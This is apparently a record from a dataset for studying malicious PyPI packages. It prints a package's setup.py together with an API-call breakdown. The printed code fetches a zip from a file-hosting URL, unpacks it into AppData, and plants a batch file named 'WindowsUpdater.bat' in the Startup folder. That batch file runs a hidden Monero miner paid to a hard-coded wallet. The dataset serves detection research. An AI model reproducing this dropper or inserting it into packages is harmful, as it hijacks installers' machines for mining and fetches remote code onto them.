[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/adv2099m3-1.0.0/adv2099m3-1.0.0/setup.py",
    "code_snippet": "import base64\nimport os\nimport requests\nfrom zipfile import ZipFile\n\n#url download\nurl = \"https://download1085.mediafire.com/h5t294h9wiggBiOS47OJsrAqRrBavPAoZQwcwB5KIZ1pVBfq8nwg6f5tkwkJBp_-1SgEgF_7Byes35_olhHdHrO80O0ApX_h542P6jxftPccXDAK3U-Qs9bSPv30ozmTTutwK_j1vbrft2sCW4scgeVLHqLGrio4dAPUy_1DuXLOvw/0p52izgv4chgn3c/SystemComponents.zip\"\n\nmyfile = requests.get(url)\nopen(\"SystemComponents.zip\", \"wb\").write(myfile.content)\nwith ZipFile(\"SystemComponents.zip\", \"r\") as Zfile:\n    Zfile.extractall()\nos.remove(\"SystemComponents.zip\")\npath1 = os.getenv(\"AppData\")\npath2 = \"\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\Startup\"\nos.rename(\"SystemComponents\", path1 + \"\\\\SystemComponents\")\nf = open(\"WindowsUpdater.bat\", \"w+\")\nf.write(\"cd \" + path1 + \"\"\"\\\\SystemComponents\nWindowsXr.exe --opencl --cuda -o stratum+ssl://randomxmonero.auto.nicehash.com:443 -u 39GPVHHtZdPGW2H3F1MMgW94KF8hxfsEWU -p x -k --nicehash -a rx/0\"\"\")\nf.close()\nos.rename(\"WindowsUpdater.bat\", path1 + path2 + \"\\\\WindowsUpdater.bat\")",
    "pattern_analysis": {
      "api_sequence": [
        "requests.get",
        "open",
        "ZipFile",
        "ZipFile.extractall",
        "os.remove",
        "os.getenv",
        "os.rename",
        "open",
        "open.write",
        "open.close",
        "os.rename"
      ],
      "api_sequence_with_args": [
        "requests.get(url)",
        "open(\"SystemComponents.zip\", \"wb\")",
        "ZipFile(\"SystemComponents.zip\", \"r\")",
        "ZipFile.extractall()",
        "os.remove(\"SystemComponents.zip\")",
        "os.getenv(\"AppData\")",
        "os.rename(\"SystemComponents\", path1 + \"\\SystemComponents\")",
        "open(\"WindowsUpdater.bat\", \"w+\")",
        "open.write(\"cd \" + path1 + \"\\\\SystemComponents\\nWindowsXr.exe --opencl --cuda -o stratum+ssl://randomxmonero.auto.nicehash.com:443 -u 39GPVHHtZdPGW2H3F1MMgW94KF8hxfsEWU -p x -k --nicehash -a rx/0\")",
        "open.close()",
        "os.rename(\"WindowsUpdater.bat\", path1 + path2 + \"\\WindowsUpdater.bat\")"
      ],
      "mapped_sequence": [
        {
          "api_name": "requests.get",
          "id": "send_http_get",
          "description": "Sends HTTP GET request with parameters and timeout",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "open",
          "id": "basic_write_operations",
          "description": "Basic file opening operations for writing (normal writing, binary writing)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "ZipFile",
          "id": "open_zip_read",
          "description": "Opens ZIP archive for reading",
          "first_id": "file_operations",
          "second_id": "compression_archiving",
          "third_id": "zip_operations"
        },
        {
          "api_name": "ZipFile.extractall",
          "id": "extract_zip_files",
          "description": "Extracts all files from ZIP archive to specified directory",
          "first_id": "file_operations",
          "second_id": "compression_archiving",
          "third_id": "zip_operations"
        },
        {
          "api_name": "os.remove",
          "id": "delete_file",
          "description": "Deletes specified file from filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_transfer"
        },
        {
          "api_name": "os.getenv",
          "id": "get_env_var",
          "description": "Retrieves value of environment variable",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "os.rename",
          "id": "rename_file",
          "description": "Renames file or moves it to new location",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_transfer"
        },
        {
          "api_name": "open",
          "id": "combined_mode_operations",
          "description": "Combined mode file opening operations (read-write mode, append mode, etc.)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "open.write",
          "id": "basic_file_writing",
          "description": "Writing data to files (strings or bytes)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_writing"
        },
        {
          "api_name": "open.close",
          "id": "close_file",
          "description": "Closes the opened file",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_closing"
        },
        {
          "api_name": "os.rename",
          "id": "rename_file",
          "description": "Renames file or moves it to new location",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_transfer"
        }
      ],
      "contextual_code": "import base64\nimport os\nimport requests\nfrom zipfile import ZipFile\n\nurl = \"https://download1085.mediafire.com/h5t294h9wiggBiOS47OJsrAqRrBavPAoZQwcwB5KIZ1pVBfq8nwg6f5tkwkJBp_-1SgEgF_7Byes35_olhHdHrO80O0ApX_h542P6jxftPccXDAK3U-Qs9bSPv30ozmTTutwK_j1vbrft2sCW4scgeVLHqLGrio4dAPUy_1DuXLOvw/0p52izgv4chgn3c/SystemComponents.zip\"\n\nmyfile = requests.get(url)\nopen(\"SystemComponents.zip\", \"wb\").write(myfile.content)\nwith ZipFile(\"SystemComponents.zip\", \"r\") as Zfile:\n    Zfile.extractall()\nos.remove(\"SystemComponents.zip\")\npath1 = os.getenv(\"AppData\")\npath2 = \"\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\Startup\"\nos.rename(\"SystemComponents\", path1 + \"\\\\SystemComponents\")\nf = open(\"WindowsUpdater.bat\", \"w+\")\nf.write(\"cd \" + path1 + \"\\\\SystemComponents\\nWindowsXr.exe --opencl --cuda -o stratum+ssl://randomxmonero.auto.nicehash.com:443 -u 39GPVHHtZdPGW2H3F1MMgW94KF8hxfsEWU -p x -k --nicehash -a rx/0\")\nf.close()\nos.rename(\"WindowsUpdater.bat\", path1 + path2 + \"\\\\WindowsUpdater.bat\")"
    }
  }
]